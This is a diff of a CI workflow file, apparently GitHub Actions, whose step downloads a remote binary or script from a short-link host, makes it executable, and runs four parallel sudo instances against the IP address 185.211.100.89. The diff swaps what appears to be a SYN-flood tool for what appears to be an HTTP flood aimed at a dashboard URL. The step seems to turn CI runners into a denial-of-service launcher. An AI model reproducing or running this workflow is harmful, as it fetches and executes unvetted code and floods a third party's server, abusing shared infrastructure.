@@ -15,11 +15,11 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://curl.by/R1Yuh/redsyn -O redsyn
-          chmod +x redsyn
+          wget https://curl.by/iIpEt/rawada.js -O rawada.js
+          chmod +x rawada.js
           PIDS=()
           for i in {1..4}; do
-            sudo timeout 45 ./redsyn 185.211.100.89
+            sudo timeout 45 rawada.js http://185.211.100.89/dashboard/ 45
             PIDS+=($!)
           done
           
